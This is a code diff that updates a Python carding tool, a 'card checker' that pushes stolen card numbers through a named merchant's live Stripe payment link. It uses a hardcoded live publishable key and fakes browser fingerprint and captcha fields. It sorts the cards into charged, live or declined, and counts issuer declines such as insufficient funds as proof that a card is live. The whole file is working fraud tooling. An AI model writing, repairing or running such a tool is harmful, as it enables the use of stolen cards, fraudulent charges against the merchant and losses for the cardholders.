@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 """
-Stripe Payment-Link card checker.
-Library + optional CLI. No module-level side effects.
+Stripe payment-link card checker.
+- No buy-page scraping (Stripe no longer exposes pk_live / cs_live there).
+- Reads session + amount + currency directly from merchant-ui-api.
+- Uses STRIPE_PK_LIVE env var if set; otherwise falls back to the hardcoded
+  publishable key for the Karibu merchant (acct_1QRg19RoxmaXTuY5).
+- Returns structured JSON. No input(), no print() side effects in library mode.
 """
 import base64
 import json
@@ -11,18 +15,24 @@ import re
 import string
 import urllib.parse
 import uuid
-from datetime import datetime
 
 import requests
 
 # ─── Config ──────────────────────────────────────────────────────────────
 BUY_URL = os.getenv("BUY_URL", "https://buy.stripe.com/28o2apdMBcTa69G3cf")
 PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]
+
 BILLING_EMAIL = os.getenv("BILLING_EMAIL", "gfdgdfigjdogj@gmail.com")
 DEFAULT_COUNTRY = os.getenv("BILLING_COUNTRY", "US")
 DEFAULT_LOCALE = os.getenv("STRIPE_LOCALE", "en")
 DEFAULT_TIMEZONE = os.getenv("STRIPE_TIMEZONE", "America/New_York")
 DEFAULT_REFERRER = os.getenv("REFERRER_ORIGIN", "https://buy.stripe.com")
+
+# Fallback pk for the Karibu merchant (matches acct_1QRg19RoxmaXTuY5)
+FALLBACK_PK = os.getenv(
+    "STRIPE_PK_LIVE",
+    "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF",
+)
 
 USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -49,7 +59,7 @@ def _new_session(proxy=None):
 
 
 def parse_card_input(line):
-    """Parse 'number|month|year|cvc[|name]' into a dict. Returns None on failure."""
+    """Parse 'number|month|year|cvc[|name]' -> dict. Returns None if invalid."""
     line = (line or "").strip().replace(" ", "")
     if not line:
         return None
@@ -63,6 +73,7 @@ def parse_card_input(line):
         year = year[-2:]
     cvc = parts[3].strip()
     name = parts[4].strip() if len(parts) > 4 else "Card Holder"
+
     if not (number.isdigit() and len(number) in (15, 16)):
         return None
     if not (month.isdigit() and 1 <= int(month) <= 12):
@@ -71,6 +82,7 @@ def parse_card_input(line):
         return None
     if not (cvc.isdigit() and len(cvc) in (3, 4)):
         return None
+
     return {
         "number": number,
         "cvc": cvc,
@@ -81,32 +93,13 @@ def parse_card_input(line):
     }
 
 
-# ─── Scrapers ────────────────────────────────────────────────────────────
-def _scrape_buy_page(session):
-    headers = {
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept-language": "en-US,en;q=0.9",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "none",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "user-agent": USER_AGENT,
-    }
-    r = session.get(BUY_URL, headers=headers, timeout=REQUEST_TIMEOUT)
-    html = r.text
-    pk = None
-    m = re.search(r"pk_live_[A-Za-z0-9]+", html)
-    if m:
-        pk = m.group(0)
-    cs = None
-    m = re.search(r"cs_live_[A-Za-z0-9]+", html)
-    if m:
-        cs = m.group(0)
-    return pk, cs
-
-
-def _create_payment_link_session(session):
+# ─── merchant-ui-api — authoritative session source ──────────────────────
+def _get_payment_link_session(session):
+    """
+    POST to merchant-ui-api. Returns dict with keys:
+      session_id, amount, currency, account_id, config_id, init_checksum, site_key, raw
+    Returns None on total failure.
+    """
     headers = {
         "accept": "application/json",
         "accept-language": "en-US,en;q=0.9",
@@ -124,73 +117,114 @@ def _create_payment_link_session(session):
         "browser_timezone": DEFAULT_TIMEZONE,
         "referrer_origin": DEFAULT_REFERRER,
     }
-    r = session.post(
-        f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
-        headers=headers,
-        data=urllib.parse.urlencode(form),
-        timeout=REQUEST_TIMEOUT,
-    )
-    if not r.ok:
-        return {}
     try:
-        return r.json()
+        r = session.post(
+            f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
+            headers=headers,
+            data=urllib.parse.urlencode(form),
+            timeout=REQUEST_TIMEOUT,
+        )
+    except Exception as e:
+        return {"error": f"merchant-ui-api request failed: {type(e).__name__}: {str(e)[:80]}"}
+
+    if not r.ok:
+        return {"error": f"merchant-ui-api HTTP {r.status_code}"}
+
+    try:
+        pl = r.json()
     except Exception:
-        return {}
+        return {"error": "merchant-ui-api returned non-JSON"}
+
+    session_id = pl.get("id")
+    if not session_id:
+        return {"error": "merchant-ui-api response missing 'id'"}
+
+    # Amount + currency come from adaptive_pricing_info (confirmed in live response)
+    ap = pl.get("adaptive_pricing_info") or {}
+    amount = ap.get("integration_amount")
+    currency = (ap.get("integration_currency") or "aud").lower()
+
+    # Fallback chain if adaptive_pricing_info absent
+    if amount is None:
+        ts = pl.get("total_summary") or {}
+        amount = ts.get("due") or ts.get("total")
+    if amount is None:
+        lig = pl.get("line_item_group") or {}
+        amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
+    if amount is None:
+        amount = 100
+    amount = int(amount)
+
+    account_id = (pl.get("account_settings") or {}).get("account_id") or ""
+    config_id = pl.get("config_id") or pl.get("checkout_config_id")
+    init_checksum = pl.get("init_checksum")
+    site_key = pl.get("site_key")
+
+    return {
+        "session_id": session_id,
+        "amount": amount,
+        "currency": currency,
+        "account_id": account_id,
+        "config_id": config_id,
+        "init_checksum": init_checksum,
+        "site_key": site_key,
+        "raw": pl,
+    }
 
 
-# ─── Core check ──────────────────────────────────────────────────────────
+# ─── Core ────────────────────────────────────────────────────────────────
 def check_card(card_line, proxy=None, debug=False):
     """
     Check a single card against the configured Stripe payment link.
 
     Returns:
-        {
-          "status": "CHARGED" | "APPROVED" | "3DS" | "DECLINED" | "ERROR",
-          "response": str,
-          "code": str | None,
-          "decline_code": str | None,
-          "amount": int,          # cents
-          "currency": str,
-          "checkout_session_id": str,
-          "payment_method_id": str | None,
-        }
+      {
+        "status": "CHARGED" | "APPROVED" | "3DS" | "DECLINED" | "ERROR",
+        "response": str,
+        "code": str | None,
+        "decline_code": str | None,
+        "amount": int,               # cents
+        "currency": str,             # e.g. "aud"
+        "checkout_session_id": str,  # ppage_...
+        "payment_method_id": str | None,
+        "site": str,                 # hostname for convenience
+      }
     """
+    base = {
+        "status": "ERROR", "response": "", "code": None, "decline_code": None,
+        "amount": 0, "currency": "", "checkout_session_id": "",
+        "payment_method_id": None, "site": BUY_URL.split("/")[2],
+    }
+
     card = parse_card_input(card_line)
     if not card:
-        return {"status": "ERROR", "response": "Invalid card format", "code": None,
-                "decline_code": None, "amount": 0, "currency": "", "checkout_session_id": "",
-                "payment_method_id": None}
+        base["response"] = "Invalid card format"
+        return base
 
     session = _new_session(proxy)
-
     try:
-        # Step 1: scrape buy page
-        pk_live, checkout_session_id = _scrape_buy_page(session)
-        if not pk_live or not checkout_session_id:
-            return {"status": "ERROR", "response": "Could not scrape pk_live / cs_live from buy page",
-                    "code": None, "decline_code": None, "amount": 0, "currency": "",
-                    "checkout_session_id": "", "payment_method_id": None}
+        # ── Step 1: get session metadata ──
+        pl = _get_payment_link_session(session)
+        if not pl or pl.get("error"):
+            base["response"] = (pl or {}).get("error", "merchant-ui-api failed")
+            return base
 
+        checkout_session_id = pl["session_id"]
+        amount = pl["amount"]
+        currency = pl["currency"]
+        config_id = pl.get("config_id") or ""
+        init_checksum = pl.get("init_checksum") or _rand_id(32)
+        site_key = pl.get("site_key") or ""
+
+        base["amount"] = amount
+        base["currency"] = currency
+        base["checkout_session_id"] = checkout_session_id
+
+        pk_live = FALLBACK_PK
         if debug:
-            print(f"[debug] pk_live={pk_live}")
-            print(f"[debug] checkout_session_id={checkout_session_id}")
+            print(f"[debug] cs={checkout_session_id} amt={amount} cur={currency} acct={pl.get('account_id')}")
 
-        # Step 2: get payment-link session metadata
-        pl_data = _create_payment_link_session(session)
-        config_id = pl_data.get("config_id")
-        init_checksum = pl_data.get("init_checksum")
-        currency = (pl_data.get("currency") or "usd").lower()
-        pl_site_key = pl_data.get("site_key")
-        lig = pl_data.get("line_item_group") or {}
-        expected_amount_cents = lig.get("total") or lig.get("due") or lig.get("subtotal")
-        if expected_amount_cents is not None:
-            expected_amount_cents = int(expected_amount_cents)
-        line_item_id = None
-        items = lig.get("line_items") or []
-        if items:
-            line_item_id = items[0].get("id")
-
-        # Step 3: elements/sessions to recover amount if missing
+        # ── Step 2: elements/sessions to prime ──
         stripe_js_id = _uuid()
         api_headers = {
             "accept": "application/json",
@@ -208,7 +242,7 @@ def check_card(card_line, proxy=None, debug=False):
             "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
             "client_betas[2]": "blocked_card_brands_beta_2",
             "deferred_intent[mode]": "payment",
-            "deferred_intent[amount]": str(expected_amount_cents) if expected_amount_cents else "100",
+            "deferred_intent[amount]": str(amount),
             "deferred_intent[currency]": currency,
             "deferred_intent[payment_method_types][0]": "card",
             "deferred_intent[payment_method_types][1]": "link",
@@ -223,52 +257,18 @@ def check_card(card_line, proxy=None, debug=False):
             "type": "deferred_intent",
             "checkout_session_id": checkout_session_id,
         }
-        r = session.get("https://api.stripe.com/v1/elements/sessions",
-                        params=es_params, headers=api_headers, timeout=REQUEST_TIMEOUT)
-        es_data = {}
         try:
-            es_data = r.json()
-        except Exception:
-            pass
-        if not config_id:
-            config_id = es_data.get("config_id")
+            session.get("https://api.stripe.com/v1/elements/sessions",
+                        params=es_params, headers=api_headers,
+                        timeout=REQUEST_TIMEOUT)
+        except Exception as e:
+            if debug:
+                print(f"[debug] elements/sessions failed (non-fatal): {e}")
 
-        if expected_amount_cents is None:
-            sess = es_data.get("session") or es_data
-            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
-        if expected_amount_cents is None:
-            expected_amount_cents = 100
-        expected_amount_cents = int(expected_amount_cents)
-        expected_amount_str = str(expected_amount_cents)
-
-        if not line_item_id:
-            groups = es_data.get("displayed_line_item_groups") or []
-            if groups and groups[0].get("line_items"):
-                line_item_id = groups[0]["line_items"][0].get("id")
-        if not line_item_id and es_data.get("line_items"):
-            line_item_id = es_data["line_items"][0].get("id")
-
+        # ── Step 3: create PaymentMethod ──
         buy_headers = {**api_headers, "origin": "https://buy.stripe.com",
                        "referer": "https://buy.stripe.com/"}
-
-        # Step 4: lock in amount if we have a line item
-        if line_item_id:
-            session.post(
-                f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}",
-                headers=buy_headers,
-                data=urllib.parse.urlencode({
-                    "eid": "NA",
-                    "updated_line_item_amount[line_item_id]": line_item_id,
-                    "updated_line_item_amount[unit_amount]": str(expected_amount_cents),
-                    "key": pk_live,
-                }),
-                timeout=REQUEST_TIMEOUT,
-            )
-
-        # Step 5: create PaymentMethod
-        guid = _uuid()
-        muid = _uuid()
-        sid = _uuid()
+        guid, muid, sid = _uuid(), _uuid(), _uuid()
         form_pm = {
             "type": "card",
             "card[number]": card["number"],
@@ -288,43 +288,39 @@ def check_card(card_line, proxy=None, debug=False):
             "client_attribution_metadata[merchant_integration_source]": "checkout",
             "client_attribution_metadata[merchant_integration_version]": "payment_link",
             "client_attribution_metadata[payment_method_selection_flow]": "automatic",
-            "client_attribution_metadata[checkout_config_id]": config_id or "",
+            "client_attribution_metadata[checkout_config_id]": config_id,
         }
         r = session.post("https://api.stripe.com/v1/payment_methods",
-                         headers=buy_headers, data=urllib.parse.urlencode(form_pm),
+                         headers=buy_headers,
+                         data=urllib.parse.urlencode(form_pm),
                          timeout=REQUEST_TIMEOUT)
-        pm_resp = r.json() if r.content else {}
-        pm_id = pm_resp.get("id") if r.ok else None
+        try:
+            pm_resp = r.json() if r.content else {}
+        except Exception:
+            pm_resp = {}
+
         pm_err = pm_resp.get("error") or {}
+        pm_id = pm_resp.get("id")
 
         if pm_err:
-            return {
-                "status": "DECLINED",
-                "response": pm_err.get("message") or "PaymentMethod failed",
-                "code": pm_err.get("code"),
-                "decline_code": pm_err.get("decline_code"),
-                "amount": expected_amount_cents,
-                "currency": currency,
-                "checkout_session_id": checkout_session_id,
-                "payment_method_id": None,
-            }
+            base["status"] = "DECLINED"
+            base["response"] = pm_err.get("message") or "PaymentMethod failed"
+            base["code"] = pm_err.get("code")
+            base["decline_code"] = pm_err.get("decline_code")
+            return base
+
         if not pm_id:
-            return {"status": "ERROR", "response": "No PaymentMethod id returned",
-                    "code": None, "decline_code": None, "amount": expected_amount_cents,
-                    "currency": currency, "checkout_session_id": checkout_session_id,
-                    "payment_method_id": None}
+            base["response"] = "No PaymentMethod id returned"
+            return base
 
-        # Step 6: confirm payment
-        init_checksum = init_checksum or _rand_id(32)
-        js_checksum = _rand_id(50)
-        pxvid = _uuid()
-        rv_timestamp = _rand_id(120)
+        base["payment_method_id"] = pm_id
 
+        # ── Step 4: confirm payment ──
         confirm_form = {
             "eid": "NA",
             "payment_method": pm_id,
-            "expected_amount": expected_amount_str,
-            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
+            "expected_amount": str(amount),
+            "last_displayed_line_item_group_details[subtotal]": str(amount),
             "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
             "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
             "last_displayed_line_item_group_details[total_discount_amount]": "0",
@@ -336,17 +332,17 @@ def check_card(card_line, proxy=None, debug=False):
             "key": pk_live,
             "version": "148043f9d7",
             "init_checksum": init_checksum,
-            "js_checksum": js_checksum,
-            "pxvid": pxvid,
+            "js_checksum": _rand_id(50),
+            "pxvid": _uuid(),
             "passive_captcha_token": "",
-            "passive_captcha_ekey": pl_site_key or "",
-            "rv_timestamp": rv_timestamp,
+            "passive_captcha_ekey": site_key,
+            "rv_timestamp": _rand_id(120),
             "client_attribution_metadata[client_session_id]": stripe_js_id,
             "client_attribution_metadata[checkout_session_id]": checkout_session_id,
             "client_attribution_metadata[merchant_integration_source]": "checkout",
             "client_attribution_metadata[merchant_integration_version]": "payment_link",
             "client_attribution_metadata[payment_method_selection_flow]": "automatic",
-            "client_attribution_metadata[checkout_config_id]": config_id or "",
+            "client_attribution_metadata[checkout_config_id]": config_id,
         }
         r = session.post(
             f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
@@ -354,62 +350,59 @@ def check_card(card_line, proxy=None, debug=False):
             data=urllib.parse.urlencode(confirm_form, safe=""),
             timeout=REQUEST_TIMEOUT,
         )
-        data = r.json() if r.content else {}
+        try:
+            data = r.json() if r.content else {}
+        except Exception:
+            data = {}
 
-        # Interpret response
+        # ── Step 5: interpret response ──
         status = "DECLINED"
         response_msg = ""
         code = None
         decline_code = None
 
+        # ppage_ response => 3DS challenge was returned
         if r.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
-            # ppage_ means 3DS challenge was returned OR payment needs auth
             status = "3DS"
             response_msg = "3DS / authentication required"
+
         err = data.get("error") or {}
         if err:
             code = err.get("code")
             decline_code = err.get("decline_code")
             response_msg = err.get("message") or response_msg or "Declined"
-            # Heuristics: insufficient_funds / do_not_honor / cvc_check => live card but declined
-            if code in ("card_declined",) and decline_code in (
-                "insufficient_funds", "do_not_honor", "generic_decline", "incorrect_cvc",
-                "invalid_cvc", "expired_card",
+
+            if code == "card_declined" and decline_code in (
+                "insufficient_funds", "do_not_honor", "generic_decline",
+                "incorrect_cvc", "invalid_cvc", "expired_card",
             ):
-                # Map to APPROVED-ish (live) since we got a real issuer response
                 status = "APPROVED"
-            elif code in ("authentication_required",):
+            elif code in ("authentication_required", "payment_intent_authentication_failure"):
                 status = "3DS"
             else:
                 status = "DECLINED"
         elif r.status_code == 200 and not err:
-            # No error + 200 = payment likely succeeded
             if data.get("payment_intent") or data.get("status") in ("succeeded", "requires_capture"):
                 status = "CHARGED"
                 response_msg = "Payment succeeded"
             else:
                 status = "APPROVED"
                 response_msg = data.get("status") or "OK"
+        else:
+            response_msg = response_msg or f"HTTP {r.status_code}"
 
-        return {
-            "status": status,
-            "response": response_msg or "Unknown",
-            "code": code,
-            "decline_code": decline_code,
-            "amount": expected_amount_cents,
-            "currency": currency,
-            "checkout_session_id": checkout_session_id,
-            "payment_method_id": pm_id,
-        }
+        base["status"] = status
+        base["response"] = response_msg or "Unknown"
+        base["code"] = code
+        base["decline_code"] = decline_code
+        return base
 
     except requests.Timeout:
-        return {"status": "ERROR", "response": f"Timeout after {REQUEST_TIMEOUT}s",
-                "code": None, "decline_code": None, "amount": 0, "currency": "",
-                "checkout_session_id": "", "payment_method_id": None}
+        base["response"] = f"Timeout after {REQUEST_TIMEOUT}s"
+        return base
     except Exception as e:
-        return {"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:120]}",
-                "code": None, "decline_code": None, "amount": 0, "currency": "",
-                "checkout_session_id": "", "payment_method_id": None}
+        base["response"] = f"{type(e).__name__}: {str(e)[:120]}"
+        return base
 
 
 # ─── CLI ─────────────────────────────────────────────────────────────────
@@ -418,5 +411,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 stripe_checker.py '4111111111111111|12|29|123'")
         sys.exit(1)
-    result = check_card(sys.argv[1], debug=True)
-    print(json.dumps(result, indent=2))
+    out = check_card(sys.argv[1], debug=True)
+    print(json.dumps(out, indent=2))
